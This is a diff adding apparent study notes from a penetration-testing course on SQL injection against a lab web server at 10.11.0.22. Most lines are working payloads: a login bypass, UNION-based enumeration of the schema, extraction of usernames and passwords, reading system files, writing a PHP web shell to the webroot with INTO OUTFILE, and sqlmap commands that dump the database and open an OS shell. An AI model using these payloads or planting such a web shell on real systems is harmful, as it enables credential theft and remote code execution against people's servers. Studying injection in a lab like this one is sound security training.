@@ -1,0 +1,50 @@
+admin' or 1=1 LIMIT 1;#
+id=1 order by 1 -> Error at 4th
+id=1 union all select 1, 2, 3 -> 3rd -> The comment field has more space, so this is a logical spot for our future exploits output
+
+Extracting data from the Database
+id=1 union all select 1, 2, @@version
+
+Next, let's output the current database user
+id=1 union all select 1, 2, user()
+
+We can enumerate database tables and column structures through the information schema, which
+stores information about the database like table and column names. We can use it to get the layout of the
+database so that we can craft better payloads to extract sensitive data.
+id=1 union all select 1, 2, table_name from information_schema.tables
+
+Let's target that table and retries the column names
+
+id=1 union all select 1, 2, column_name from information_schema.columns where table_name='users'
+Armed with this information, we can extract the usernames and passwords from the table.
+
+We know that the original query selects three columns and the webpage displays columns two and three. If we update our Union payload, we can display the user names in column two and the passwords in column 3.
+id=1 union all select 1, username, password from users
+
+This will output the database usernames in the name field and password in the comments field.
+-> We can verify these by logging into the admin page.
+
+From SQL Injection to Code Execution
+
+Read file
+id=1 union all select 1, 2, load_file('C:/Windows/System32/drivers/etc/hosts')
+
+Into outfile
+
+id=1 union all select 1, 2, "<?php echo '<pre>' shell_exec($_GET['cmd']).'</pre>';?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'
+
+-> http://10.11.0.22/backdoor.php?cmd=ifconfig
+
+
+Automating SQL Injection
+sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id"
+
+We can now use SQLmap to automate the extraction of data from the database
+
+sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id" --dbms=mysql --dump
+
+For example, using the OS shell parameter will attempt to automatically upload and execute a remote command shell on the target system:
+
+sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id" --dbms=mysql --os-shell
+> PHP 
+
